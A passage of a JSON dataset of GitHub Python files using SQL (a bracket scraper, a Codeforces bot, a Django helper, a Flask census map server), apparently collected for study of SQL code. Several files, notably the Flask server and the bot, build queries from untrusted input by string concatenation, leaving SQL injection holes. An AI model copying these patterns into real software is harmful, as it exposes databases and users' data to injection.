54\n                        display_name = bracket_utils.get_display_base(bracket, counter=i)\n                        # We don't care about doubles tournaments\n                        if 'doubles' in display_name.lower() or 'dubs' in display_name.lower():\n                            LOG.info('We are skipping the tournament {} because it is a doubles tournament'.format(display_name))\n                            continue\n\n                        self.data_processor.process(bracket, name, display_name, new_bracket=True)\n\n            else:\n                # We need to create first and last from scratch\n                first = bracket_utils._get_first_valid_url(base_url)\n                last = bracket_utils._get_last_valid_url(base_url, first)\n\n                # This is new data, we need to put it into the db\n                sql = \"INSERT INTO valids (base_url, first, last, scene) VALUES (\"\n                sql += \"'\"+str(base_url)+\"', \"+str(first)+ \", \"+str(last)+\", '\"+str(name)+\"');\"\n                self.db.exec(sql)\n\n                for i in range(first, last+1):\n                    bracket = base_url.replace('###', str(i))\n                    # Create the display name for this bracket\n                    # Eg challonge.com/NP9ATX54 -> NP9 54\n                    display_name = bracket_utils.get_display_base(bracket, counter=i)\n                    # We don't care about doubles tournaments\n                    if 'doubles' in display_name.lower() or 'dubs' in display_name.lower():\n                        LOG.info('We are skipping the tournament {} because it is a doubles tournament'.format(display_name))\n                        continue\n\n                    self.data_processor.process(bracket, name, display_name)\n\n                    # Calculate ranks after each tournament so we can see how players are progressing\n        if not analyzed_scenes and should_tweet:\n            tweet('About to start ranking for scene {}'.format(name))\n        self.data_processor.check_and_update_ranks(name)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/flourishcodes/holbertonschool-higher_level_programming/blob/4eb2d73fd9d942f5ae126ed522dddee2c19ae0f2",
        "file_path": "/0x0F-python-object_relational_mapping/3-my_safe_filter_states.py",
        "source": "#!/usr/bin/python3\n\"\"\"\nPython scripte to list items from MySQL\n\"\"\"\n\nimport MySQLdb\n\nfrom sys import argv\n\n\nif __name__ == \"__main__\":\n    db = MySQLdb.connect(host=\"localhost\", port=3306, user=argv[1],\n                         passwd=argv[2], db=argv[3], charset=\"utf8\")\n    c = db.cursor()\n    c.execute(\"SELECT * FROM states WHERE name LIKE %s ORDER BY\\\n    id ASC\",(argv[4],))\n    for rows in c.fetchall():\n        print(rows)\n\n    c.close()\n    db.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/lissrbay/codeforces_bot/blob/5d548d632db408dc11d3c852726e5ad09199b6b6",
        "file_path": "/bases/createcfbase.py",
        "source": "import requests\nimport sqlite3\nimport os\nfrom bs4 import BeautifulSoup\navailable_tags = {'math', \"strings\", \"trees\", \"graphs\", \"dp\", \"greedy\", \"geometry\", \"combinatorics\"}\n\ndef create_cf_base():\n    url = 'http://codeforces.com/problemset/'\n    r = requests.get(url)\n    max_page = 0\n    soup = BeautifulSoup(r.text, \"lxml\")\n    base = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + \"\\\\cf.db\")\n    conn = base.cursor()\n    conn.execute(\"create table problems (problem INTEGER, diff CHAR)\")\n    for i in available_tags:\n        conn.execute(\"create table \" + i + \" (problems INTEGER, diff CHAR)\")\n\n    for link in soup.find_all(attrs={\"class\" : \"page-index\"}):\n        s = link.find('a')\n        s2 = s.get(\"href\").split('/')\n        max_page = max(max_page, int(s2[3]))\n\n    a = 0\n    b = 0\n    f = False\n    for i in range(1, max_page + 1):\n        r = requests.get('http://codeforces.com/problemset/' + '/page/' + str(i))\n        soup = BeautifulSoup(r.text, \"lxml\")\n        old = ''\n        for link in soup.find_all('a'):\n            s = link.get('href')\n            if s != None and s.find('/problemset') != -1:\n                s = s.split('/')\n                if len(s) == 5 and old != s[3] + s[4]:\n                    a = s[3]\n                    b = s[4]\n                    old = s[3] + s[4]\n                    if not f:\n                        f = True\n                        last_update = old\n                    conn.execute(\"insert into problems values (?, ?)\", (a, b))\n                if len(s) == 4 and s[3] in available_tags:\n                    conn.execute(\"insert into \" + s[3] + \" values (?, ?)\", (a, b))\n\n    base.commit()\n    base.close()\n    settings = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + \"\\\\settings.db\")\n    conn = settings.cursor()\n    conn.execute(\"create table users (chat_id INTEGER, username STRING, last_update STRING, last_problem STRING, state INTEGER)\")\n    conn.execute(\"create table last_update_problemset (problem STRING)\")\n    conn.execute(\"insert into last_update_problemset values (?)\", (last_update, ))\n    settings.commit()\n    settings.close()\n\n\ndef create_theory_table(): #create EMPTY theory table\n    theory = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + \"\\\\theory.db\")\n    conn = theory.cursor()\n    for i in available_tags:\n        conn.execute(\"create table \" + str(i) + \" (link STRING)\")\n    theory.commit()\n    theory.close()\n\n\npath = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'cf.db')\nif not os.path.exists(path):\n    create_cf_base()\n\npath = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'theory.db')\nif not os.path.exists(path):\n    create_theory_table()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/lissrbay/codeforces_bot/blob/5d548d632db408dc11d3c852726e5ad09199b6b6",
        "file_path": "/bases/createuserbase.py",
        "source": "import requests\nimport sqlite3\nimport os\n\nfrom bs4 import BeautifulSoup\ndef check_username(username):\n    if username == \"\":\n        return True\n    if len(username.split()) > 1:\n        return True\n    r = requests.get('http://codeforces.com/submissions/' + username)\n    soup = BeautifulSoup(r.text, \"lxml\")\n    if soup.find(attrs={\"class\":\"verdict\"}) == None:\n        return True\n    return False\n\n\ndef clean_base(username):\n    path = os.path.join(os.path.abspath(os.path.dirname(__file__)) + \"\\\\users\\\\\" + username + '.db')\n    if os.path.exists(path):\n        os.remove(path)\n\ndef init_user(username, chat_id):\n    conn = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + \"\\\\users\\\\\" + username + '.db')\n    conn2 = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + '\\\\cf.db')\n    cursor = conn.cursor()\n    cursor2 = conn2.cursor()\n    cursor.execute(\"CREATE TABLE result (problem INTEGER, diff STRING, verdict STRING)\")\n    cursor2.execute(\"SELECT * FROM problems\")\n    x = cursor2.fetchone()\n    while x != None:\n        cursor.execute(\"insert into result values (?, ?, ? )\", (x[0], x[1], \"NULL\"))\n        x = cursor2.fetchone()\n\n    url = 'http://codeforces.com/submissions/' + username\n    r = requests.get(url)\n    max_page = 1\n    soup = BeautifulSoup(r.text, \"lxml\")\n\n    for link in soup.find_all(attrs={\"class\": \"page-index\"}):\n        s = link.find('a')\n        s2 = s.get(\"href\").split('/')\n        max_page = max(max_page, int(s2[4]))\n\n    old = \"\"\n    r = requests.get('http://codeforces.com/submissions/' + username + '/page/0')\n    soup = BeautifulSoup(r.text, \"lxml\")\n    last_try = soup.find(attrs={\"class\":\"status-small\"})\n    if not last_try == None:\n        last_try = str(last_try).split()\n        last_try = str(last_try[2]) + str(last_try[3])\n\n    for i in range(1, max_page + 1):\n        r = requests.get('http://codeforces.com/submissions/' + username + '/page/' + str(i))\n        soup = BeautifulSoup(r.text, \"lxml\")\n        count = 0\n        ver = soup.find_all(attrs={\"class\": \"submissionVerdictWrapper\"})\n        for link in soup.find_all('a'):\n            s = link.get('href')\n            if s != None and s.find('/problemset') != -1:\n                s = s.split('/')\n                if len(s) == 5:\n                    s2 = str(ver[count]).split()\n                    s2 = s2[5].split('\\\"')\n                    count += 1\n                    cursor.execute(\"select * from result where problem = '\" + s[3] + \"'and diff = '\" + s[4] + \"'\")\n                    x = cursor.fetchone()\n                    if s2[1] == 'OK' and x != None:\n                        cursor.execute(\"update result set verdict = '\" + s2[1] + \"' where problem = '\" + s[3] + \"' and diff = '\" + s[4] + \"'\")\n                    if x != None and x[2] != 'OK':\n                        cursor.execute(\"update result set verdict = '\" + s2[1] +\"' where problem = '\" + s[3] + \"' and diff = '\" + s[4] + \"'\")\n\n    conn.commit()\n    conn.close()\n    conn2.close()\n\n    settings = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + \"\\\\settings.db\")\n    conn = settings.cursor()\n    conn.execute(\"select * from last_update_problemset\")\n    last_problem = conn.fetchone()\n    conn.execute(\"select * from users where chat_id = '\" + str(chat_id) + \"'\")\n    x = conn.fetchone()\n    if x == None:\n        conn.execute(\"insert into users values (?, ?, ?, ?, ?)\", (chat_id, username, str(last_try), str(last_problem[0]), 1))\n    else:\n        conn.execute(\"update users set username = '\" + str(username) + \"' where chat_id = '\" + str(chat_id) + \"'\")\n        conn.execute(\"update users set last_update = '\" + str(last_try) + \"' where chat_id = '\" + str(chat_id) + \"'\")\n        conn.execute(\"update users set last_problem = '\" + str(last_problem[0]) + \"' where chat_id = '\" + str(chat_id) + \"'\")\n        conn.execute(\"update users set state = '\" + str(1) + \"' where chat_id = '\" + str(chat_id) + \"'\")\n    settings.commit()\n    settings.close()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/lissrbay/codeforces_bot/blob/5d548d632db408dc11d3c852726e5ad09199b6b6",
        "file_path": "/bases/problem.py",
        "source": "#,     .\n# , ,   .   .\n#  Stuxnet      .    .\n#,     .        .\n#        ,      - .\n#   .\n\nimport sqlite3\nimport os\nimport random\nimport matplotlib.pyplot as plt\n\navailable_tags = ['math', \"strings\", \"trees\", \"graphs\", \"dp\", \"greedy\", \"geometry\", \"combinatorics\"]\navailable_diff = ['A', 'B', 'C', 'D', 'E', 'F']\n\ndef get_unsolved_problem(tag, username):\n    tasks = list()\n    list_of_current_tags = list()\n    list_of_current_diff = list()\n\n    def find_intersection(tag):\n        conn = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + \"\\\\users\\\\\" + username + '.db')\n        conn2 = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + '\\\\cf.db')\n        cursor = conn.cursor()\n        cursor2 = conn2.cursor()\n        cursor2.execute(\"SELECT * FROM \" + tag)\n        a = list()\n        problem_and_diff = cursor2.fetchone()\n\n        while problem_and_diff != None:\n            cursor.execute(\"SELECT * FROM result WHERE problem = '\" + str(problem_and_diff[0]) + \"' AND diff = '\" + str(problem_and_diff[1]) + \"' AND NOT verdict = 'OK'\")\n            problem_and_diff_and_ok = cursor.fetchone()\n            if problem_and_diff_and_ok != None and problem_and_diff_and_ok in tasks:\n                a.append(problem_and_diff_and_ok)\n            problem_and_diff = cursor2.fetchone()\n\n        conn.close()\n        conn2.close()\n        return a\n\n\n    list_of_current_tags = list()\n    for i in available_tags:\n        if i in tag:\n            list_of_current_tags.append(i)\n\n    list_of_current_diff = list()\n    for i in available_diff:\n        if i in tag:\n            list_of_current_diff.append(i)\n    f = False\n    if len(list_of_current_tags) == 0 and list_of_current_diff !=0:\n        list_of_current_tags = available_tags.copy()\n        f = True\n    if len(list_of_current_tags) == 0 and len(list_of_current_diff) == 0:\n        return \"Plz try again\"\n    if len(list_of_current_diff) == 0 and len(list_of_current_tags) != 0:\n        list_of_current_diff = available_diff.copy()\n        f = True\n\n\n    conn = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + \"\\\\users\\\\\" + username + '.db')\n    conn2 = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + '\\\\cf.db')\n    cursor = conn.cursor()\n    cursor2 = conn2.cursor()\n    cursor2.execute(\"SELECT * FROM \" + list_of_current_tags[0])\n    problem_and_diff = cursor2.fetchone()\n\n    while problem_and_diff != None:\n        if problem_and_diff[1] in list_of_current_diff:\n            cursor.execute(\"SELECT * FROM result WHERE problem = '\" + str(problem_and_diff[0]) + \"' AND diff = '\" + str(\n                problem_and_diff[1]) + \"' AND NOT verdict = 'OK'\")\n            problem_and_diff_and_ok = cursor.fetchone()\n            if problem_and_diff_and_ok != None:\n                tasks.append(problem_and_diff_and_ok)\n        problem_and_diff = cursor2.fetchone()\n\n    conn.close()\n    conn2.close()\n    if not f:\n        for i in range(1, len(list_of_current_tags)):\n            tasks = find_intersection(list_of_current_tags[i])\n\n    random.seed()\n    if len(tasks) > 0:\n        ind1 = random.randint(0, len(tasks) - 1)\n        s1 = str(tasks[ind1][0]) + '/' + tasks[ind1][1]\n        tasks.pop(ind1)\n        return 'http://codeforces.com/problemset/problem/' + s1\n    else:\n        return \"You have solved all tasks with this tag, nice!\"\n\ndef get_theory_from_tag(tag):\n    if not tag in available_tags:\n        return \"Incorrect tag.\"\n\n    base = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + \"\\\\theory.db\")\n    conn = base.cursor()\n    conn.execute(\"select * from \" + tag)\n    x = conn.fetchone()\n    s = \"\"\n    while x != None:\n        s += str(x[0]) + '\\n'\n        x = conn.fetchone()\n    base.close()\n    return s\n\nclass Pair():\n    def __init__(self, first, second):\n        self.first = first\n        self.second = second\n\ndef create_stats_picture(username):\n    conn = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + \"\\\\users\\\\\" + username + '.db')\n    conn2 = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + '\\\\cf.db')\n    cursor = conn.cursor()\n    cursor2 = conn2.cursor()\n    a = list()\n    b = list()\n    leg = list()\n    sum = 0\n    for i in available_tags:\n        cursor2.execute(\"SELECT * FROM \" + str(i))\n        x = cursor2.fetchone()\n        count = 0\n        while x != None:\n            cursor.execute(\"SELECT * FROM result WHERE problem = '\" + str(x[0]) + \"' AND diff = '\" + str(\n                x[1]) + \"' AND verdict = 'OK'\")\n            y = cursor.fetchone()\n            if y != None:\n                count += 1\n            x = cursor2.fetchone()\n        a.append(Pair(count, i))\n        sum += count\n\n    conn.close()\n    conn2.close()\n    if sum == 0:\n        return True\n    for i in range(len(a)):\n        if a[i].first / sum != 0:\n            b.append(a[i].first / sum)\n            leg.append(a[i].second)\n\n    fig1, ax1 = plt.subplots()\n    ax1.pie(b,  autopct='%1.1f%%',\n            shadow=True, startangle=90)\n    ax1.axis('equal')\n    ax1.legend(leg)\n    path = os.path.join(os.path.abspath(os.path.dirname(__file__)) + \"\\\\users\\\\\", username + '.png')\n    if os.path.exists(path):\n        os.remove(path)\n    plt.savefig(os.path.abspath(os.path.dirname(__file__)) + \"\\\\users\\\\\" + username + \".png\")\n    plt.close()\n    return False\n\n\ndef create_text_stats(username):\n    verdict = {\"COMPILATION_ERROR\" : 0, \"OK\" : 0, \"TIME_LIMIT_EXCEEDED\" : 0, \"WRONG_ANSWER\" : 0, \"RUNTIME_ERROR\" : 0, \"MEMORY_LIMIT_EXCEEDED\" : 0}\n    colors = ['red', 'green', 'tan', 'blue', 'purple', 'orange']\n    conn = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + \"\\\\users\\\\\" + username + '.db')\n    conn2 = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + '\\\\cf.db')\n    cursor = conn.cursor()\n    cursor2 = conn2.cursor()\n    count = 0\n    a = list()\n    b = list()\n    for i in available_tags:\n        cursor2.execute(\"SELECT * FROM \" + str(i))\n        x = cursor2.fetchone()\n        while x != None:\n            cursor.execute(\"SELECT * FROM result WHERE problem = '\" + str(x[0]) + \"' AND diff = '\" + str(x[1]) + \"'\")\n            y = cursor.fetchone()\n            if y != None:\n                for j in verdict.keys():\n                    if y[2] == j:\n                        verdict[j] += 1\n                        count += 1\n\n            x = cursor2.fetchone()\n\n    for i in verdict.keys():\n        a.append(i)\n        b.append(verdict[i])\n    fig1, ax1 = plt.subplots()\n    ax1.pie(b, labels = b, colors = colors,\n            shadow=True, startangle=90)\n    ax1.axis('equal')\n    ax1.legend(a)\n    ax1.set_title('How many different verdict in last status of problem you have: ')\n    path = os.path.join(os.path.abspath(os.path.dirname(__file__)) + \"\\\\users\\\\\", username + '.png')\n    if os.path.exists(path):\n        os.remove(path)\n    plt.savefig(os.path.abspath(os.path.dirname(__file__)) + \"\\\\users\\\\\" + username + \".png\")\n    conn.close()\n    conn2.close()\n    plt.close()\n    s = username + \" has at least one submissions in \" + str(count) + \" problems\"\n    return s\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/joonas-yoon/reviewus/blob/266d2cdb3369ae6f769128ca43f9a641ee1d5948",
        "file_path": "/reviewus/db.py",
        "source": "import sys\nimport logging\n\nfrom django.db import connection, DatabaseError\nfrom reviewus.settings import DEBUG\n\nlogger = logging.getLogger(__name__)\n\n\nclass DBConnection:\n  instance = None\n  con = None\n\n  def __new__(cls):\n    if DBConnection.instance is None:\n      DBConnection.instance = object.__new__(cls)\n    return DBConnection.instance\n\n  def __init__(self):\n    if DBConnection.con is None:\n      try:\n        DBConnection.con = connection.cursor()\n        logger.info('################## Database connection opened.')\n      except DatabaseError as db_error:\n        logger.error(\"################## Erreur :\\n{0}\".format(db_error))\n\n  def __del__(self):\n    if DBConnection.con is not None:\n      DBConnection.con.close()\n      logger.info('################## Database connection closed.')\n\n\n\"\"\"\n@author joonas\n\"\"\"\nclass DBManager:\n  # instance = DBConnection()\n\n  @staticmethod\n  def conn():\n    try:\n      # return DBManager.instance.con # This for singleton, but has error yet\n      return connection.cursor()\n    except:\n      return DBManager.error_handle()\n\n  @staticmethod\n  def execute(sql, cursor=False):\n    _cursor = DBManager.conn()\n    try:\n      result = _cursor.execute(sql)\n      if cursor:\n        return _cursor\n      return result\n    except:\n      return DBManager.error_handle()\n\n  @staticmethod\n  def execute_and_fetch(sql, as_row=False):\n    try:\n      cursor = DBManager.execute(sql, cursor=True)\n      result = cursor.fetchone()\n      if as_row:\n        return DBManager.as_row(cursor, result)\n      return result\n    except:\n      return DBManager.error_handle()\n\n  @staticmethod\n  def execute_and_fetch_all(sql, as_list=False):\n    try:\n      cursor = DBManager.execute(sql, cursor=True)\n      result = cursor.fetchall()\n      if as_list:\n        return DBManager.as_list(cursor, result)\n      return result\n    except:\n      return DBManager.error_handle()\n\n  @staticmethod\n  def get_fields(cursor):\n    return [col[0] for col in cursor.description]\n\n  @staticmethod\n  def as_row(cursor, query_set):\n    if cursor is None or query_set is None:\n      return dict()\n\n    fields = DBManager.get_fields(cursor)\n    return dict(zip(fields, list(query_set)))\n\n  @staticmethod\n  def as_list(cursor, query_set):\n    if cursor is None or query_set is None:\n      return list()\n\n    fields = DBManager.get_fields(cursor)\n    results = list(query_set)\n    try:\n      return [dict(zip(fields, result)) for result in results]\n    except:\n      return error_handle('Columns are not macthed')\n\n\n  def error_handle(error=None):\n    if error is None:\n      error = sys.exc_info()[0]\n\n    if DEBUG:\n      logger.error(error)\n\n    try:\n      return error\n    except:\n      return 'Unexpected error'\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/minus34/census-loader/blob/c06f5683c94a2efb6b7dce83b8048683eb72d2d6",
        "file_path": "/web/server.py",
        "source": "\nimport ast\nimport json\n# import math\n# import os\nimport psycopg2\n# import sys\nimport utils\n\nfrom datetime import datetime\n\nfrom contextlib import contextmanager\n\nfrom flask import Flask\nfrom flask import render_template\nfrom flask import request\nfrom flask import Response\nfrom flask_compress import Compress\n\nfrom psycopg2 import extras\nfrom psycopg2.pool import ThreadedConnectionPool\n\napp = Flask(__name__, static_url_path='')\nCompress(app)\n\n# set command line arguments\nargs = utils.set_arguments()\n\n# get settings from arguments\nsettings = utils.get_settings(args)\n\n# create database connection pool\npool = ThreadedConnectionPool(10, 30,\n                              database=settings[\"pg_db\"],\n                              user=settings[\"pg_user\"],\n                              password=settings[\"pg_password\"],\n                              host=settings[\"pg_host\"],\n                              port=settings[\"pg_port\"])\n\n\n@contextmanager\ndef get_db_connection():\n    \"\"\"\n    psycopg2 connection context manager.\n    Fetch a connection from the connection pool and release it.\n    \"\"\"\n    try:\n        connection = pool.getconn()\n        yield connection\n    finally:\n        pool.putconn(connection)\n\n\n@contextmanager\ndef get_db_cursor(commit=False):\n    \"\"\"\n    psycopg2 connection.cursor context manager.\n    Creates a new cursor and closes it, committing changes if specified.\n    \"\"\"\n    with get_db_connection() as connection:\n        cursor = connection.cursor(cursor_factory=psycopg2.extras.RealDictCursor)\n        try:\n            yield cursor\n            if commit:\n                connection.commit()\n        finally:\n            cursor.close()\n\n\n@app.route(\"/\")\ndef homepage():\n    return render_template('index.html')\n\n\n@app.route(\"/get-bdy-names\")\ndef get_boundary_name():\n    # Get parameters from querystring\n    min = int(request.args.get('min'))\n    max = int(request.args.get('max'))\n\n    boundary_zoom_dict = dict()\n\n    for zoom_level in range(min, max + 1):\n        boundary_zoom_dict[\"{0}\".format(zoom_level)] = utils.get_boundary_name(zoom_level)\n\n    return Response(json.dumps(boundary_zoom_dict), mimetype='application/json')\n\n\n@app.route(\"/get-metadata\")\ndef get_metadata():\n    full_start_time = datetime.now()\n    start_time = datetime.now()\n\n    # Get parameters from querystring\n    num_classes = int(request.args.get('n'))\n    raw_stats = request.args.get('stats')\n\n    # replace all maths operators to get list of all the stats we need\n    search_stats = raw_stats.upper().replace(\" \", \"\").replace(\"(\", \"\").replace(\")\", \"\") \\\n        .replace(\"+\", \",\").replace(\"-\", \",\").replace(\"/\", \",\").replace(\"*\", \",\").split(\",\")\n\n    # TODO: add support for numbers in equations - need to strip them from search_stats list\n\n    # equation_stats = raw_stats.lower().split(\",\")\n\n    # print(equation_stats)\n    # print(search_stats)\n\n    # get stats tuple for query input (convert to lower case)\n    search_stats_tuple = tuple([stat.lower() for stat in search_stats])\n\n    # get all boundary names in all zoom levels\n    boundary_names = list()\n\n    for zoom_level in range(0, 16):\n        bdy_name = utils.get_boundary_name(zoom_level)\n\n        if bdy_name not in boundary_names:\n            boundary_names.append(bdy_name)\n\n    # get stats metadata, including the all important table number and map type (raw values based or normalised by pop)\n    sql = \"SELECT lower(sequential_id) AS id, \" \\\n          \"lower(table_number) AS \\\"table\\\", \" \\\n          \"replace(long_id, '_', ' ') AS description, \" \\\n          \"column_heading_description AS type, \" \\\n          \"CASE WHEN lower(long_id) LIKE '%%median%%' OR lower(long_id) LIKE '%%average%%' THEN 'values' \" \\\n          \"ELSE 'normalised' END AS maptype \" \\\n          \"FROM {0}.metadata_stats \" \\\n          \"WHERE lower(sequential_id) IN %s \" \\\n          \"ORDER BY sequential_id\".format(settings[\"data_schema\"], )\n\n    with get_db_cursor() as pg_cur:\n        try:\n            pg_cur.execute(sql, (search_stats_tuple,))\n        except psycopg2.Error:\n            return \"I can't SELECT :\\n\\n\" + sql\n\n        # Retrieve the results of the query\n        rows = pg_cur.fetchall()\n\n    # output is the main content, row_output is the content from each record returned\n    response_dict = dict()\n    response_dict[\"type\"] = \"StatsCollection\"\n    response_dict[\"classes\"] = num_classes\n\n    output_array = list()\n\n    # get metadata for all boundaries (done in one go for frontend performance)\n    for boundary_name in boundary_names:\n        output_dict = dict()\n        output_dict[\"boundary\"] = boundary_name\n\n        boundary_table = \"{0}.{1}\".format(settings[\"web_schema\"], boundary_name)\n\n        # # get id and area fields for boundary\n        # bdy_id_field = \"\"\n        # bdy_area_field = \"\"\n\n        # for boundary_dict in settings['bdy_table_dicts']:\n            # if boundary_dict[\"boundary\"] == boundary_name:\n                # bdy_id_field = boundary_dict[\"id_field\"]\n                # bdy_area_field = boundary_dict[\"area_field\"]\n\n        i = 0\n        feature_array = list()\n\n        # For each row returned assemble a dictionary\n        for row in rows:\n            feature_dict = dict(row)\n            feature_dict[\"id\"] = feature_dict[\"id\"].lower()\n            feature_dict[\"table\"] = feature_dict[\"table\"].lower()\n\n            data_table = \"{0}.{1}_{2}\".format(settings[\"data_schema\"], boundary_name, feature_dict[\"table\"])\n\n            # get the values for the map classes\n            with get_db_cursor() as pg_cur:\n                stat_field = \"CASE WHEN bdy.population > 0 THEN tab.{0} / bdy.population * 100.0 ELSE 0 END\" \\\n                    .format(feature_dict[\"id\"], )\n                feature_dict[\"classes\"] = utils.get_equal_interval_bins(data_table, boundary_table, stat_field, pg_cur, settings)\n\n                # add dict to output array of metadata\n                feature_array.append(feature_dict)\n\n            i += 1\n\n        output_dict[\"stats\"] = feature_array\n        output_array.append(output_dict)\n\n        print(\"Got metadata for {0} in {1}\".format(boundary_name, datetime.now() - start_time))\n\n    # Assemble the JSON\n    response_dict[\"boundaries\"] = output_array\n\n    print(\"Returned metadata in {0}\".format(datetime.now() - full_start_time))\n\n    return Response(json.dumps(response_dict), mimetype='application/json')\n\n\n# def get_bins(boundary_name, feature_dict, num_classes, stat_field, bdy_id_field):\n#     value_dict = dict()\n#\n#     # kmeans cluster data to get the best set of classes\n#     # (uses a nice idea from Alex Ignatov to use a value as a coordinate in the PostGIS ST_ClusterKMeans function!)\n#     data_table = \"{0}.{1}_{2}\".format(settings[\"data_schema\"], boundary_name, feature_dict[\"table\"])\n#     # bdy_table = \"{0}.{1}_{2}_aust\".format(settings[\"boundary_schema\"], boundary_name, settings[\"census_year\"])\n#     bdy_table = \"{0}.{1}\".format(settings[\"web_schema\"], boundary_name)\n#\n#     sql = \"WITH sub AS (\" \\\n#           \"WITH points AS (\" \\\n#           \"SELECT {0} as val, ST_MakePoint({0}, 0) AS pnt FROM {1} AS tab \" \\\n#           \"INNER JOIN {2} AS bdy ON tab.{3} = bdy.id) \" \\\n#           \"SELECT val, ST_ClusterKMeans(pnt, {5}) OVER () AS cluster_id FROM points) \" \\\n#           \"SELECT MAX(val) AS val FROM sub GROUP BY cluster_id ORDER BY val\" \\\n#         .format(stat_field, data_table, bdy_table, settings['region_id_field'], bdy_id_field, num_classes)\n#\n#     # print(sql)\n#\n#     with get_db_cursor() as pg_cur:\n#         pg_cur.execute(sql)\n#         rows = pg_cur.fetchall()\n#\n#         j = 0\n#\n#         for row in rows:\n#             value_dict[\"{0}\".format(j)] = row[\"val\"]\n#             j += 1\n#\n#     # # get max values\n#     # sql = \"SELECT MAX({0}) AS val FROM {1}.{2}_{3} AS tab \" \\\n#     #       \"INNER JOIN {4}.{2}_zoom_10 AS bdy ON tab.{5} = bdy.id \" \\\n#     #       \"WHERE geom IS NOT NULL\" \\\n#     #     .format(stat_field, settings[\"data_schema\"], boundary_name, feature_dict[\"table\"],\n#     #             settings[\"boundary_schema\"] + \"_display\", settings['region_id_field'])\n#     #\n#     # with get_db_cursor() as pg_cur:\n#     #     pg_cur.execute(sql)\n#     #     row = pg_cur.fetchone()\n#     #     max_value = row[\"val\"]\n#     #\n#     # increment = max_value / float(num_classes)\n#     #\n#     # for j in range(0, num_classes):\n#     #     value_dict[\"{0}\".format(j)] = increment * float(j + 1)\n#\n#     return value_dict\n\n\n@app.route(\"/get-data\")\ndef get_data():\n    full_start_time = datetime.now()\n    start_time = datetime.now()\n\n    # Get parameters from querystring\n\n    map_left = request.args.get('ml')\n    map_bottom = request.args.get('mb')\n    map_right = request.args.get('mr')\n    map_top = request.args.get('mt')\n\n    stat_id = request.args.get('s')\n    table_id = request.args.get('t')\n    boundary_name = request.args.get('b')\n    zoom_level = int(request.args.get('z'))\n\n    # get the number of decimal places for the output GeoJSON to reduce response size & speed up rendering\n    decimal_places = utils.get_decimal_places(zoom_level)\n\n    # TODO: add support for equations\n\n    # get the boundary table name from zoom level\n    if boundary_name is None:\n        boundary_name = utils.get_boundary_name(zoom_level)\n\n    display_zoom = str(zoom_level).zfill(2)\n\n    stat_table_name = boundary_name + \"_\" + table_id\n\n    boundary_table_name = \"{0}\".format(boundary_name)\n\n    with get_db_cursor() as pg_cur:\n        print(\"Connected to database in {0}\".format(datetime.now() - start_time))\n        start_time = datetime.now()\n\n        envelope_sql = \"ST_MakeEnvelope({0}, {1}, {2}, {3}, 4283)\".format(map_left, map_bottom, map_right, map_top)\n        geom_sql = \"geojson_{0}\".format(display_zoom)\n\n        sql = \"SELECT bdy.id, bdy.name, bdy.population, tab.{0} / bdy.area AS density, \" \\\n              \"CASE WHEN bdy.population > 0 THEN tab.{0} / bdy.population * 100.0 ELSE 0 END AS percent, \" \\\n              \"tab.{0}, {1} AS geometry \" \\\n              \"FROM {2}.{3} AS bdy \" \\\n              \"INNER JOIN {4}.{5} AS tab ON bdy.id = tab.{6} \" \\\n              \"WHERE bdy.geom && {7}\" \\\n            .format(stat_id, geom_sql, settings['web_schema'], boundary_table_name, settings['data_schema'],\n                    stat_table_name, settings['region_id_field'], envelope_sql)\n\n        try:\n            pg_cur.execute(sql)\n        except psycopg2.Error:\n            return \"I can't SELECT : \" + sql\n\n        # print(\"Ran query in {0}\".format(datetime.now() - start_time))\n        # start_time = datetime.now()\n\n        # Retrieve the results of the query\n        rows = pg_cur.fetchall()\n        # row_count = pg_cur.rowcount\n\n        # Get the column names returned\n        col_names = [desc[0] for desc in pg_cur.description]\n\n    print(\"Got records from Postgres in {0}\".format(datetime.now() - start_time))\n    start_time = datetime.now()\n\n    # # Find the index of the column that holds the geometry\n    # geom_index = col_names.index(\"geometry\")\n\n    # output is the main content, row_output is the content from each record returned\n    output_dict = dict()\n    output_dict[\"type\"] = \"FeatureCollection\"\n\n    i = 0\n    feature_array = list()\n\n    # For each row returned...\n    for row in rows:\n        feature_dict = dict()\n        feature_dict[\"type\"] = \"Feature\"\n\n        properties_dict = dict()\n\n        # For each field returned, assemble the feature and properties dictionaries\n        for col in col_names:\n            if col == 'geometry':\n                feature_dict[\"geometry\"] = ast.literal_eval(str(row[col]))\n            elif col == 'id':\n                feature_dict[\"id\"] = row[col]\n            else:\n                properties_dict[col] = row[col]\n\n        feature_dict[\"properties\"] = properties_dict\n\n        feature_array.append(feature_dict)\n\n        # start over\n        i += 1\n\n    # Assemble the GeoJSON\n    output_dict[\"features\"] = feature_array\n\n    print(\"Parsed records into JSON in {1}\".format(i, datetime.now() - start_time))\n    print(\"Returned {0} records  {1}\".format(i, datetime.now() - full_start_time))\n\n    return Response(json.dumps(output_dict), mimetype='application/json')\n\n\nif __name__ == '__main__':\n    # import threading, webbrowser\n    # # url = \"http://127.0.0.1:8081?stats=B2712,B2772,B2775,B2778,B2781,B2793\"\n    # url = \"http://127.0.0.1:8081/?stats=B2793&z=12\"\n    # threading.Timer(5, lambda: webbrowser.open(url)).start()\n\n    app.run(host='0.0.0.0', port=8081, 